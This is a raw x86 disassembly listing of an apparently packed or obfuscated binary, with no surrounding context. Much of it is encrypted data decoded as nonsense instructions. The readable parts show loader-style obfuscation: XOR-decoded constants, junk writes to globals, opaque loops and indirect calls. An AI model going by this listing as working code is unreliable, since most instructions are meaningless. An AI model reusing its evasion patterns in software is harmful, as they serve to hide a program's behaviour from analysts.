  411828:	dec    BYTE PTR ds:0x916b34ad
  41182e:	pusha  
  41182f:	pop    ebp
  411830:	push   0xffffff8f
  411832:	int3   
  411833:	shl    dh,1
  411835:	les    eax,FWORD PTR [edi]
  411837:	call   0x42e00052
  41183c:	xlat   BYTE PTR ds:[ebx]
  41183d:	fmul   QWORD PTR [edi]
  41183f:	pop    ebp
  411840:	push   ds
  411841:	addr16 jg 0x41188b
  411844:	push   esp
  411845:	jbe    0x411855
  411847:	iret   
  411848:	xchg   ecx,eax
  411849:	push   ecx
  41184a:	mov    eax,0xa2d62e8b
  41184f:	dec    ebx
  411850:	enter  0x8121,0xfc
  411854:	fcom   DWORD PTR [edx-0x1e1b957d]
  41185a:	test   DWORD PTR [ebx-0x5edd78ae],esi
  411860:	and    ebp,esi
  411862:	repz (bad) [ebx]
  411865:	out    0x39,eax
  411867:	fdivr  QWORD PTR [ebp+0x6c6a5557]
  41186d:	add    dh,BYTE PTR [ecx-0x41]
  411870:	je     0x41187e
  411872:	dec    ecx
  411873:	xor    ah,BYTE PTR [edx+0x3c3ddb33]
  411879:	mov    ecx,0x7e7127ef
  41187e:	mov    BYTE PTR [eax-0x7e],ah
  411881:	stos   BYTE PTR es:[edi],al
  411882:	mov    ebp,0x6ce6d99e
  411887:	or     DWORD PTR [ecx+ebx*4],ebx
  41188a:	xchg   DWORD PTR [ecx+edi*1-0x29b94417],esp
  411891:	jg     0x4118aa
  411893:	and    eax,0x5416e87b
  411898:	cmp    BYTE PTR [edi+0x2d4ae03a],dl
  41189e:	mov    bl,0xe9
  4118a0:	stos   DWORD PTR es:[edi],eax
  4118a1:	add    ah,al
  4118a3:	sub    eax,ecx
  4118a5:	push   0x2c
  4118a7:	push   0xffffffd9
  4118a9:	test   BYTE PTR [ebp+0x71],bl
  4118ac:	nop
  4118ad:	cdq    
  4118ae:	icebp  
  4118af:	mov    bl,0x4f
  4118b1:	dec    ebp
  4118b2:	nop
  4118b3:	pop    edx
  4118b4:	xor    DWORD PTR [esi-0x2f54e88a],esp
  4118ba:	into   
  4118bb:	out    dx,al
  4118bc:	imul   esi,DWORD PTR [esi],0xffffffec
  4118bf:	mov    eax,0x7f0e8d9b
  4118c4:	shr    DWORD PTR ds:0x3442b7b7,cl
  4118ca:	mov    ?,WORD PTR [ebp+0x6f]
  4118cd:	sahf   
  4118ce:	ja     0x41190e
  4118d0:	pop    edx
  4118d1:	and    DWORD PTR [esi],eax
  4118d3:	sub    DWORD PTR [edx],esi
  4118d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118d6:	xor    al,0x22
  4118d8:	sub    al,0x68
  4118da:	aam    0x5d
  4118dc:	or     BYTE PTR [ebp-0x4615d0cd],0xed
  4118e3:	enter  0x4825,0xed
  4118e7:	leave  
  4118e8:	adc    edi,DWORD PTR [ebx-0x52]
  4118eb:	add    DWORD PTR [edi+0x9],esp
  4118ee:	or     DWORD PTR [edx+ebp*1],esi
  4118f1:	in     eax,dx
  4118f2:	push   ebp
  4118f3:	aaa    
  4118f4:	js     0x4118c4
  4118f6:	pop    eax
  4118f7:	out    dx,al
  4118f8:	push   edi
  4118f9:	clc    
  4118fa:	pop    eax
  4118fb:	fadd   DWORD PTR [esi-0x503bab5c]
  411901:	int    0x24
  411903:	dec    esi
  411904:	add    BYTE PTR ds:0x65dfb281,ch
  41190a:	or     edi,edx
  41190c:	push   ss
  41190d:	sbb    DWORD PTR [esi+0x52],ecx
  411910:	leave  
  411911:	dec    esi
  411912:	cmp    BYTE PTR [edx+0x2c],dl
  411915:	and    DWORD PTR [edi],ecx
  411917:	pushf  
  411918:	and    dh,BYTE PTR [bp-0x4e]
  41191c:	imul   esi,DWORD PTR [ebp+0x47],0xffffff9b
  411920:	sub    ch,dl
  411922:	jmp    0x913e:0x2a9efdcd
  411929:	out    0x40,eax
  41192b:	cwde   
  41192c:	and    edx,edx
  41192e:	push   ebx
  41192f:	mov    esi,0xcd4204dc
  411934:	in     eax,0x20
  411936:	jo     0x411989
  411938:	mov    cl,0x82
  41193a:	jmp    0x8d610bda
  41193f:	adc    DWORD PTR [edi],edx
  411941:	inc    edx
  411942:	jmp    0x41199d
  411944:	inc    DWORD PTR [esi-0x52]
  411947:	iret   
  411948:	pop    ebp
  411949:	jae    0x4119a7
  41194b:	test   DWORD PTR [ebx+ebx*8-0x4f],edi
  41194f:	and    DWORD PTR [ecx-0x2a],edx
  411952:	shl    eax,cl
  411954:	pushf  
  411955:	retf   0xbf1c
  411958:	cli    
  411959:	rol    DWORD PTR [ecx-0x5b80ce4f],0x17
  411960:	aas    
  411961:	add    dl,ah
  411963:	sub    DWORD PTR [edx],0x446bea74
  411969:	dec    eax
  41196a:	inc    ebx
  41196b:	(bad)  
  41196c:	mov    esp,0xe6eb59f9
  411971:	test   BYTE PTR [ecx-0x637e590c],0x1e
  411978:	add    ebp,DWORD PTR [edi+esi*1]
  41197b:	add    edi,DWORD PTR [esi]
  41197d:	push   edi
  41197e:	sub    DWORD PTR [ebx],esi
  411980:	sbb    eax,0x3d553194
  411985:	bound  esi,QWORD PTR [ecx+0x7a]
  411988:	inc    ebp
  411989:	push   ss
  41198a:	(bad)  
  41198b:	inc    ebx
  41198c:	or     BYTE PTR [ebp-0x5b169e0c],0x6d
  411993:	in     al,0x36
  411995:	push   eax
  411996:	pop    edi
  411997:	nop
  411998:	mov    esp,esi
  41199a:	in     al,dx
  41199b:	or     eax,0xb92a0d33
  4119a0:	outs   dx,DWORD PTR ds:[esi]
  4119a1:	push   es
  4119a2:	sub    eax,0xf2a78798
  4119a7:	adc    al,0xfd
  4119a9:	dec    esp
  4119aa:	and    al,0x68
  4119ac:	scas   eax,DWORD PTR es:[edi]
  4119ad:	scas   eax,DWORD PTR es:[edi]
  4119ae:	xchg   edi,eax
  4119af:	stc    
  4119b0:	xchg   esi,eax
  4119b1:	nop
  4119b2:	jo     0x4119a0
  4119b4:	xor    BYTE PTR ds:0xa072e992,bh
  4119ba:	sar    BYTE PTR [ecx],cl
  4119bc:	pushf  
  4119bd:	inc    edx
  4119be:	lock cmp DWORD PTR ds:0xc3d18ecc,ebx
  4119c5:	mov    ds:0x5bd075da,al
  4119ca:	pusha  
  4119cb:	and    edi,eax
  4119cd:	jg     0x4119aa
  4119cf:	push   esi
  4119d0:	les    eax,FWORD PTR [esi+0x29]
  4119d3:	and    eax,0x48b64d11
  4119d8:	fcomp  QWORD PTR [ebx]
  4119da:	out    0x51,al
  4119dc:	cli    
  4119dd:	dec    ecx
  4119de:	das    
  4119df:	mov    ecx,0xec2fb8d6
  4119e4:	(bad)  [ebp+0xe2e86fc]
  4119ea:	inc    edx
  4119eb:	outs   dx,BYTE PTR ds:[esi]
  4119ec:	test   ecx,eax
  4119ee:	cmp    al,0x7
  4119f0:	ins    DWORD PTR es:[edi],dx
  4119f1:	mov    al,ds:0x871cf6d2
  4119f6:	push   ds
  4119f7:	xchg   esp,eax
  4119f8:	and    eax,0xb205214c
  4119fd:	imul   edi,eax,0xffffffe9
  411a00:	fneni(8087 only) 
  411a02:	(bad)
  411a06:	jl     0x411a10
  411a08:	jmp    0x6fc2:0x9be45150
  411a0f:	int    0xf9
  411a11:	dec    esi
  411a12:	add    eax,0xc952a8d2
  411a17:	test   DWORD PTR [ecx+edi*2-0xe9b3d48],ebx
  411a1e:	push   esi
  411a1f:	popa   
  411a20:	jle    0x4119c2
  411a22:	or     al,0xa8
  411a24:	xor    ecx,esi
  411a26:	add    ecx,edi
  411a28:	xor    edx,edx
  411a2a:	div    ecx
  411a2c:	mov    ecx,DWORD PTR [ebp-0x4]
  411a2f:	xor    ecx,esi
  411a31:	lea    eax,[ecx+eax*1+0x3272f6]
  411a38:	mov    ecx,DWORD PTR [ebp+0x8]
  411a3b:	mov    edx,DWORD PTR [ebp-0x20]
  411a3e:	mov    DWORD PTR [edx+ecx*4],eax
  411a41:	mov    eax,DWORD PTR [ebp-0xc]
  411a44:	mov    ecx,DWORD PTR [ebp+0x8]
  411a47:	xor    eax,esi
  411a49:	lea    eax,[eax+ecx*1+0x3272f6]
  411a50:	mov    DWORD PTR [ebp+0x8],eax
  411a53:	mov    eax,DWORD PTR [ebp-0xc]
  411a56:	mov    ecx,DWORD PTR [ebp+0x14]
  411a59:	xor    eax,esi
  411a5b:	add    eax,edi
  411a5d:	imul   eax,DWORD PTR [ecx]
  411a60:	mov    ecx,DWORD PTR [ebp-0x4]
  411a63:	mov    edx,DWORD PTR [ebp+0x8]
  411a66:	xor    ecx,esi
  411a68:	lea    ecx,[ecx+edx*1+0x3272f6]
  411a6f:	cmp    ecx,eax
  411a71:	jne    0x40f668
  411a77:	mov    eax,DWORD PTR [ebp-0x4]
  411a7a:	xor    eax,esi
  411a7c:	add    eax,edi
  411a7e:	mov    DWORD PTR [ebp-0x10],eax
  411a81:	mov    ebx,0x65655
  411a86:	add    ebx,0x3234
  411a8c:	xchg   ebx,esi
  411a8e:	xor    ebx,ebx
  411a90:	push   esi
  411a91:	mov    esi,ebx
  411a93:	pop    ebx
  411a94:	mov    edx,esi
  411a96:	add    ebx,0x1002
  411a9c:	lea    eax,[ebp-0x18]
  411a9f:	add    edx,eax
  411aa1:	add    edx,0x5
  411aa4:	push   edx
  411aa5:	inc    esi
  411aa6:	pop    ecx
  411aa7:	dec    ecx
  411aa8:	xchg   ecx,eax
  411aa9:	dec    eax
  411aaa:	xchg   ecx,eax
  411aab:	dec    ecx
  411aac:	xchg   ecx,edx
  411aae:	dec    edx
  411aaf:	push   edx
  411ab0:	mov    edx,ebx
  411ab2:	pop    ebx
  411ab3:	dec    ebx
  411ab4:	call   DWORD PTR [ebx]
  411ab6:	cmp    DWORD PTR [ebp+0x10],esi
  411ab9:	je     0x411ada
  411abf:	xchg   edx,eax
  411ac0:	push   0xc
  411ac2:	pop    ecx
  411ac3:	dec    ecx
  411ac4:	push   0x3
  411ac6:	pop    ebx
  411ac7:	inc    ebx
  411ac8:	xchg   ebx,ecx
  411aca:	inc    ecx
  411acb:	sub    ebx,ecx
  411acd:	xchg   ebx,ecx
  411acf:	dec    ecx
  411ad0:	dec    ecx
  411ad1:	mov    eax,DWORD PTR [ebp-0x1c]
  411ad4:	imul   eax,ecx
  411ad7:	add    esp,eax
  411ad9:	xchg   edx,eax
  411ada:	push   eax
  411adb:	xor    ebx,ebx
  411add:	mov    edx,esp
  411adf:	dec    edx
  411ae0:	inc    ebx
  411ae1:	add    ebx,DWORD PTR [edx+ebx*1]
  411ae4:	dec    ebx
  411ae5:	xor    edx,edx
  411ae7:	add    DWORD PTR [ebp-0x10],ebx
  411aea:	pop    ebx
  411aeb:	mov    eax,DWORD PTR [ebp-0x10]
  411aee:	pop    edi
  411aef:	pop    esi
  411af0:	pop    ebx
  411af1:	leave  
  411af2:	ret    0x10
  411af5:	push   ebp
  411af6:	mov    ebp,esp
  411af8:	push   ecx
  411af9:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  411b00:	mov    eax,DWORD PTR [ebp-0x4]
  411b03:	sbb    DWORD PTR ds:0x428ea7,ebx
  411b09:	mov    edx,DWORD PTR [ebp+0x10]
  411b0c:	mov    ecx,0x75108af
  411b11:	sbb    DWORD PTR ds:0x428eaf,0x428e4b
  411b1b:	xor    eax,ecx
  411b1d:	or     DWORD PTR ds:0x428e77,0x428e2b
  411b27:	add    eax,0x3272f6
  411b2c:	and    DWORD PTR ds:0x428e77,0x1e6e
  411b36:	mov    DWORD PTR [edx],eax
  411b38:	mov    eax,DWORD PTR [ebp+0xc]
  411b3b:	xor    eax,ecx
  411b3d:	or     DWORD PTR ds:0x428eab,0x179
  411b47:	push   esi
  411b48:	mov    esi,DWORD PTR [ebp+0x10]
  411b4b:	mov    edx,DWORD PTR ds:0x428ea7
  411b51:	sbb    DWORD PTR ds:0x428eaf,edx
  411b57:	mov    edx,0x3272f6
  411b5c:	xor    DWORD PTR ds:0x428eab,0x428e83
  411b66:	add    eax,edx
  411b68:	or     DWORD PTR ds:0x428e83,0x428e6f
  411b72:	mov    DWORD PTR [esi+0x4],eax
  411b75:	mov    eax,DWORD PTR [ebp+0x14]
  411b78:	movzx  esi,WORD PTR ds:0x428ecf
  411b7f:	sub    DWORD PTR ds:0x428e9b,esi
  411b85:	mov    esi,DWORD PTR [ebp+0x10]
  411b88:	adc    DWORD PTR ds:0x428e5b,0xf72
  411b92:	mov    DWORD PTR [esi+0x8],eax
  411b95:	mov    eax,DWORD PTR [ebp+0x18]
  411b98:	mov    esi,DWORD PTR [ebp+0x10]
  411b9b:	mov    DWORD PTR [esi+0xc],eax
  411b9e:	mov    eax,DWORD PTR [ebp+0x1c]
  411ba1:	mov    esi,DWORD PTR [ebp+0x10]
  411ba4:	mov    DWORD PTR [esi+0x10],eax
  411ba7:	mov    eax,DWORD PTR [ebp+0x8]
  411baa:	xor    eax,ecx
  411bac:	add    eax,edx
  411bae:	pop    esi
  411baf:	leave  
  411bb0:	ret    0x18
  411bb3:	push   ebp
  411bb4:	mov    ebp,esp
  411bb6:	sub    esp,0x9c
  411bbc:	sbb    ecx,0x4d1
  411bc2:	mov    ecx,DWORD PTR [ebp+0x8]
  411bc5:	mov    eax,0x8a9b
  411bca:	xor    ax,WORD PTR [ecx+0x20]
  411bce:	mov    ecx,DWORD PTR ds:0x428ea7
  411bd4:	adc    DWORD PTR ds:0x428e9f,ecx
  411bda:	mov    ecx,0x3b5d
  411bdf:	sub    DWORD PTR ds:0x428eab,0x1476
  411be9:	add    ax,cx
  411bec:	movzx  eax,ax
  411bef:	mov    DWORD PTR ds:0x428e8b,0x1b
  411bf9:	cmp    DWORD PTR ds:0x428e8b,0x0
  411c00:	je     0x411c4c
  411c06:	cmp    DWORD PTR ds:0x428e8b,0x2
  411c0d:	ja     0x411c4c
  411c13:	jmp    0x411c20
  411c18:	push   0x4
  411c1a:	call   DWORD PTR ds:0x42aa0b
  411c20:	cmp    DWORD PTR ds:0x428e8b,0x3
  411c27:	jne    0x411c3a
  411c2d:	mov    ecx,DWORD PTR ds:0x428e8b
  411c33:	dec    ecx
  411c34:	mov    DWORD PTR ds:0x428e8b,ecx
  411c3a:	mov    ecx,DWORD PTR ds:0x428e8b
  411c40:	dec    ecx
  411c41:	mov    DWORD PTR ds:0x428e8b,ecx
  411c47:	jmp    0x411bf9
  411c4c:	mov    DWORD PTR [ebp-0x10],eax
  411c4f:	mov    BYTE PTR [ebp-0x1],0x82
  411c53:	lea    eax,[ebp-0x1]
  411c56:	or     DWORD PTR ds:0x428e33,0x2387
  411c60:	mov    DWORD PTR [ebp-0xc],eax
  411c63:	xor    DWORD PTR ds:0x428e7f,edi
  411c69:	mov    al,BYTE PTR [ebp-0x1]
  411c6c:	mov    ecx,DWORD PTR [ebp-0xc]
  411c6f:	sbb    DWORD PTR ds:0x428ebf,0x63b1
  411c79:	xor    al,0x7f
  411c7b:	sbb    DWORD PTR ds:0x428e43,0x428e93
  411c85:	add    al,0x4
  411c87:	adc    DWORD PTR ds:0x428e5b,0xd9d
  411c91:	mov    BYTE PTR [ecx],al
  411c93:	and    eax,DWORD PTR ds:0x428eaf
  411c99:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  411ca0:	push   ebx
  411ca1:	mov    ecx,DWORD PTR ds:0x428e57
  411ca7:	add    DWORD PTR ds:0x428e6f,ecx
  411cad:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  411cb4:	not    eax
  411cb6:	mov    ecx,DWORD PTR [ebp-0x18]
  411cb9:	mov    DWORD PTR ds:0x428ebf,0x1e
  411cc3:	cmp    DWORD PTR ds:0x428ebf,0x0
  411cca:	je     0x4140d3
  411cd0:	cmp    DWORD PTR ds:0x428ebf,0x3
  411cd7:	jg     0x4140d3
  411cdd:	jmp    0x411cf2
  411ce2:	push   0x428e97
  411ce7:	push   0x1953
  411cec:	call   DWORD PTR ds:0x42aa0f
  411cf2:	cmp    DWORD PTR ds:0x428ebf,0x4
  411cf9:	jne    0x411d0a
  411cff:	mov    eax,ds:0x428ebf
  411d04:	dec    eax
  411d05:	mov    ds:0x428ebf,eax
  411d0a:	mov    eax,ds:0x428ebf
  411d0f:	dec    eax
  411d10:	mov    ds:0x428ebf,eax
  411d15:	jmp    0x411cc3
  411d1a:	jmp    0x4140d3
  411d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d20:	test   al,0xbe
  411d22:	cdq    
  411d23:	mov    esp,0x1c848485
  411d28:	pcmpgtw mm0,QWORD PTR [eax-0x3302e310]
  411d2f:	xor    DWORD PTR [ebx+0x60e78383],ecx
  411d35:	add    DWORD PTR [ebx+0x700e033b],0xffffffcd
  411d3c:	aas    
  411d3d:	stos   DWORD PTR es:[edi],eax
  411d3e:	push   ebx
  411d3f:	ss inc ebx
  411d41:	mov    WORD PTR [ecx+0x79],ss
  411d44:	add    BYTE PTR [edx],dh
  411d46:	pop    ecx
  411d47:	repnz sahf 
  411d49:	or     ebx,DWORD PTR [ecx-0x55bf7828]
  411d4f:	mov    edi,0x9c5a4aa7
  411d54:	inc    esp
  411d55:	fwait
  411d56:	jle    0x411d15
  411d58:	push   ss
  411d59:	das    
  411d5a:	push   esp
  411d5b:	shr    BYTE PTR [ebx],0xf0
  411d5e:	mov    edx,edi
  411d60:	cs xor ch,BYTE PTR ds:[ebx-0x8]
  411d65:	mov    DWORD PTR [ebp-0x2ca50db6],eax
  411d6b:	mov    edi,0xbab37152
  411d70:	or     BYTE PTR [eax-0x4792b0e4],0x31
  411d77:	pop    ecx
  411d78:	pop    edx
  411d79:	or     dl,dl
  411d7b:	jle    0x411d43
  411d7d:	lds    ecx,FWORD PTR [eax]
  411d7f:	mov    al,0x50
  411d81:	pop    esp
  411d82:	pop    eax
  411d83:	je     0x411de7
  411d85:	mov    al,ds:0x44f6689c
  411d8a:	jmp    0x58fdc598
  411d8f:	lock jmp 0xdaade90a
  411d95:	inc    edi
  411d96:	inc    esi
  411d97:	xchg   DWORD PTR [edi+0x51],eax
  411d9a:	push   esi
  411d9b:	sub    al,0xe2
  411d9d:	push   edx
  411d9e:	inc    ebx
  411d9f:	jmp    0x47ad:0x9b69cadb
  411da6:	mov    edi,ebp
  411da8:	int    0x9a
  411daa:	and    BYTE PTR [ebx],bh
  411dac:	push   ecx
  411dad:	adc    DWORD PTR [ebp+0x4a373fbf],esp
  411db3:	sub    ebp,0x2c
  411db6:	dec    eax
  411db7:	pop    ebp
  411db8:	add    ebp,ebp
  411dba:	stos   DWORD PTR es:[edi],eax
  411dbb:	cmp    edi,edx
  411dbd:	mov    al,0x4f
  411dbf:	mov    ebx,0xc15d3218
  411dc4:	out    dx,al
  411dc5:	and    al,0x11
  411dc7:	stos   BYTE PTR es:[edi],al
  411dc8:	rcr    DWORD PTR [esi-0x3731e70b],0xd9
  411dcf:	in     eax,dx
  411dd0:	ds aam 0xe8
  411dd3:	add    eax,0xdd15f4f3
  411dd8:	stos   BYTE PTR es:[edi],al
  411dd9:	sub    bl,bh
  411ddb:	xchg   DWORD PTR [ebx-0x6d],eax
  411dde:	mov    al,0xea
  411de0:	stos   DWORD PTR es:[edi],eax
  411de1:	inc    edi
  411de2:	xor    DWORD PTR [ecx+0x555962c7],ebp
  411de8:	fnstsw WORD PTR [ecx+0x3c]
  411deb:	lea    edx,[ebx+0x7c]
  411dee:	fs pop ebx
  411df0:	or     DWORD PTR [ecx-0x73b78dc4],ecx
  411df6:	jo     0x411db3
  411df8:	mov    eax,ds:0xb435fb07
  411dfd:	xchg   edx,eax
  411dfe:	das    
  411dff:	(bad)  
  411e00:	sbb    ebx,DWORD PTR [ebx+0x44]
  411e03:	cmp    al,0xf6
  411e05:	mov    WORD PTR cs:[ecx],cs
  411e08:	(bad)  
  411e09:	pop    ebx
  411e0a:	pop    edx
  411e0b:	scas   al,BYTE PTR es:[edi]
  411e0c:	test   al,0x18
  411e0e:	sti    
  411e0f:	dec    BYTE PTR [ebx]
  411e11:	test   al,0x15
  411e13:	call   0x6c0366da
  411e18:	in     al,dx
  411e19:	adc    cl,BYTE PTR [esi]
  411e1b:	mov    edx,gs
  411e1d:	mov    ds:0x3a7a5c53,al
  411e22:	sub    edx,eax
  411e24:	or     ebx,DWORD PTR [esi-0x60]
  411e27:	icebp  
  411e28:	mov    bl,0xf
  411e2a:	add    edx,ebp
  411e2c:	lea    ecx,[ecx-0x43]
  411e2f:	xor    dh,BYTE PTR [ecx-0x20]
  411e32:	leave  
  411e33:	mov    eax,ecx
  411e35:	or     DWORD PTR [ebp+0x57],ecx
  411e38:	xor    al,0xdd
  411e3a:	push   es
  411e3b:	sbb    eax,0x8b61b938
  411e40:	dec    ebx
  411e41:	dec    ebp
  411e42:	adc    eax,0xb25f1bf8
  411e47:	cmc    
  411e48:	(bad)  
  411e49:	fild   QWORD PTR [esi]
  411e4b:	or     eax,0x36c57c23
  411e50:	scas   al,BYTE PTR es:[edi]
  411e51:	jno    0x411e6d
  411e53:	and    BYTE PTR [ecx-0x44],cl
  411e56:	(bad)  
  411e57:	in     al,0x24
  411e59:	lea    esi,[ebx-0x2b]
  411e5c:	lock inc edi
  411e5e:	fmul   QWORD PTR [edi-0x559b9693]
  411e64:	dec    ebx
  411e65:	loopne 0x411dee
  411e67:	imul   ecx,DWORD PTR [edx],0xffffffc5
  411e6a:	shr    DWORD PTR [ebp-0x7],0xa1
  411e6e:	dec    edx
  411e6f:	hlt    
  411e70:	mov    ebx,0xf5019836
  411e75:	ss sbb eax,0xec4689bb
  411e7b:	pusha  
  411e7c:	jnp    0x411ec8
  411e7e:	lahf   
  411e7f:	js     0x411e13
  411e81:	fisttp QWORD PTR [ecx]
  411e83:	fld    QWORD PTR [edi+0x0]
  411e86:	sub    bl,bh
  411e88:	xchg   BYTE PTR [esi],al
  411e8a:	shr    DWORD PTR ds:0x326151a2,1
  411e90:	pop    ss
  411e91:	es ins BYTE PTR es:[edi],dx
  411e93:	jmp    0x34be8c37
  411e98:	xchg   ecx,eax
  411e99:	mov    edx,0x6bf5e144
  411e9e:	sbb    ah,BYTE PTR [eax+0x37403ac4]
  411ea4:	sbb    al,0x8f
  411ea6:	imul   BYTE PTR [ebx+eiz*4]
  411ea9:	lahf   
  411eaa:	jns    0x411ef3
  411eac:	neg    ebx
  411eae:	mov    al,ds:0x5f0ef73d
  411eb3:	push   0xa3c31806
  411eb8:	shl    DWORD PTR [edi],1
  411eba:	inc    ecx
  411ebb:	scas   al,BYTE PTR es:[edi]
  411ebc:	xchg   edx,eax
  411ebd:	or     eax,0x177e58cb
  411ec2:	into   
  411ec3:	mov    esp,DWORD PTR [edx-0x3ae5b822]
  411ec9:	jg     0x411ea6
  411ecb:	pop    ss
  411ecc:	pop    edi
  411ecd:	repz in eax,dx
  411ecf:	shr    esp,1
  411ed1:	lods   al,BYTE PTR ds:[esi]
  411ed2:	pusha  
  411ed3:	dec    esi
  411ed4:	icebp  
  411ed5:	inc    ecx
  411ed6:	cmp    bl,0x5e
  411ed9:	retf   
  411eda:	jg     0x411e82
  411edc:	ret    0x786d
  411edf:	sub    dl,BYTE PTR [si]
  411ee2:	sub    al,0x65
  411ee4:	sbb    DWORD PTR [ecx-0x3],edx
  411ee7:	retf   0x435e
  411eea:	pop    es
  411eeb:	pcmpeqw mm2,mm0
  411eee:	popf   
  411eef:	mov    edi,0xe0d054d6
  411ef4:	push   eax
  411ef5:	inc    edx
  411ef6:	imul   BYTE PTR [edx-0x3]
  411ef9:	mov    ecx,0xccd3dd4e
  411efe:	xchg   ecx,eax
  411eff:	fcmovnu st,st(6)
  411f01:	mov    ah,0x69
  411f03:	ds ds enter 0x6cf8,0x6e
  411f09:	fldcw  WORD PTR [edx+0x7f308304]
  411f0f:	es aam 0xda
  411f12:	mov    ch,0x23
  411f14:	add    edi,edi
  411f16:	pop    esp
  411f17:	loope  0x411ecf
  411f19:	imul   BYTE PTR gs:[edx+0x2f87beca]
  411f20:	sbb    al,0x6a
  411f22:	or     al,0xe9
  411f24:	mov    esp,0xea98aa6b
  411f29:	cmp    eax,0xc371a4e9
  411f2e:	and    esp,eax
  411f30:	rcr    DWORD PTR [eax-0x57],0x28
  411f34:	not    bl
  411f36:	mov    dh,0xde
  411f38:	xor    dl,dl
  411f3a:	ret    
  411f3b:	stc    
  411f3c:	leave  
  411f3d:	pop    edx
  411f3e:	fisub  DWORD PTR [esi+esi*8+0x2e60af3]
  411f45:	mov    ss,WORD PTR ss:[esi]
  411f48:	aam    0xc8
  411f4a:	inc    ecx
  411f4b:	pop    eax
  411f4c:	jne    0x411f73
  411f4e:	push   eax
  411f4f:	inc    DWORD PTR [ecx+esi*1]
  411f52:	call   0x5c19809a
  411f57:	xchg   esi,eax
  411f58:	out    0x9c,eax
  411f5a:	imul   esp,DWORD PTR ds:0x3c9c65d,0xffffffd3
  411f61:	fstp   TBYTE PTR [eax]
  411f63:	jge    0x411fc8
  411f65:	fisubr WORD PTR [edi+0x4f90ec5e]
  411f6b:	mov    al,0x5c
  411f6d:	cmp    BYTE PTR [edi],dl
  411f6f:	xor    DWORD PTR [ebp+ebx*2+0x3c1449c6],ebx
  411f76:	sub    bh,ch
  411f78:	in     al,0xc
  411f7a:	jle    0x411f8a
  411f7c:	int3   
  411f7d:	jl     0x411fa9
  411f7f:	jmp    0x6bb7088
  411f84:	fld    st(6)
  411f86:	sub    al,0x63
  411f88:	(bad)  
  411f89:	das    
  411f8a:	cmc    
  411f8b:	nop
  411f8c:	xchg   esi,eax
  411f8d:	push   0xffffffba
  411f8f:	mov    esp,0x1b7a2c5b
  411f94:	outs   dx,BYTE PTR ds:[esi]
  411f95:	mov    dh,0x1f
  411f97:	cmp    ecx,esi
  411f99:	addr16 jne 0x411f9d
  411f9c:	inc    edi
  411f9d:	jbe    0x411f4e
  411f9f:	inc    esi
  411fa0:	fisub  WORD PTR [ecx]
  411fa2:	outs   dx,BYTE PTR ds:[esi]
  411fa3:	dec    esp
  411fa4:	sti    
  411fa5:	and    ebx,DWORD PTR [edx-0x48f1e75c]
  411fab:	nop
  411fac:	in     eax,0x22
  411fae:	push   ds
  411faf:	pop    edx
  411fb0:	ja     0x412004
  411fb2:	xchg   DWORD PTR [edi+edi*8],esi
  411fb5:	pushf  
  411fb6:	mov    bh,0x13
  411fb8:	out    0xb5,eax
  411fba:	adc    cl,bl
  411fbc:	repnz mov DWORD PTR ds:0xe60c90b3,esi
  411fc3:	push   ecx
  411fc4:	sub    al,0x1d
  411fc6:	jbe    0x411f81
  411fc8:	cmp    eax,0xf5dd01b2
  411fcd:	and    esi,DWORD PTR [edx]
  411fcf:	push   edx
  411fd0:	sbb    eax,0x3a3d52e2
  411fd5:	les    esi,FWORD PTR [ebx+esi*1]
  411fd8:	dec    eax
  411fd9:	mul    BYTE PTR [ebx+0x2b575d52]
  411fdf:	rol    DWORD PTR [ebx+0x407bc495],0x5d
  411fe6:	je     0x412016
  411fe8:	fmulp  st(2),st
  411fea:	fld    st(1)
  411fec:	xchg   edi,eax
  411fed:	cmc    
  411fee:	ret    0xc027
  411ff1:	bound  esi,QWORD PTR [ecx]
  411ff3:	mov    ch,0xcf
  411ff5:	test   eax,0x673e9c01
  411ffa:	loop   0x412011
  411ffc:	mov    ds:0x8e13a517,eax
  412001:	lds    ecx,FWORD PTR [ecx]
  412003:	lock fild WORD PTR [ebx+0x66c97ac6]
  41200a:	outs   dx,DWORD PTR ds:[esi]
  41200b:	sub    eax,ebx
  41200d:	pop    ebp
  41200e:	mov    bl,0xf
  412010:	adc    BYTE PTR [eax],al
  412012:	lock lock rcl DWORD PTR [ebp+0x65],0xe9
  412018:	mov    ebx,DWORD PTR [esi+ebx*8-0x399ee4e7]
  41201f:	iret   
  412020:	adc    eax,DWORD PTR [ecx+0x59]
  412023:	out    dx,al
  412024:	adc    esi,DWORD PTR [ebp+0x57a066c6]
  41202a:	pop    ebx
  41202b:	or     edx,DWORD PTR [ecx]
  41202d:	or     DWORD PTR [ebp+0x15cc3f6a],0xffffff83
  412034:	mov    ecx,0x67659d9b
  412039:	push   esi
  41203a:	enter  0x2c6f,0x97
  41203e:	xchg   edx,eax
  41203f:	sub    esp,ebp
  412041:	ror    esp,0x3f
  412044:	add    ch,bh
  412046:	cli    
  412047:	mov    ds:0x56ace2f7,al
  41204c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41204d:	jmp    0x3f48:0xae6effeb
  412054:	or     ebx,ebp
  412056:	jecxz  0x41206e
  412058:	(bad)  
  412059:	loopne 0x411ffd
  41205b:	add    al,0x6e
  41205d:	cmp    BYTE PTR ds:[eax-0x75],ch
  412061:	ins    BYTE PTR es:[edi],dx
  412062:	mov    ah,0x7b
  412064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412065:	sahf   
  412066:	call   0x7efe7a5b
  41206b:	lahf   
  41206c:	adc    ebp,DWORD PTR [eax]
  41206e:	loope  0x4120d4
  412070:	xchg   DWORD PTR [ecx],esi
  412072:	add    DWORD PTR [ecx-0x58d5fb15],esp
  412078:	cmp    bl,BYTE PTR [edi]
  41207a:	cmp    BYTE PTR [edi+0x2f],cl
  41207d:	pop    ds
  41207e:	fld    QWORD PTR [esp+edi*8-0x452ba77b]
  412085:	test   al,0x47
  412087:	lahf   
  412088:	sahf   
  412089:	jnp    0x41203c
  41208b:	btr    DWORD PTR [ecx],eax
  41208e:	sti    
  41208f:	(bad)  
  412090:	mov    ebx,0xda7e24ea
  412095:	and    DWORD PTR [edx+edx*1+0x1f9a51],esp
  41209c:	jo     0x41201e
  41209e:	imul   esi,ecx,0x26
  4120a1:	inc    esi
  4120a2:	cmp    ebx,DWORD PTR [ebx]
  4120a4:	stos   BYTE PTR es:[edi],al
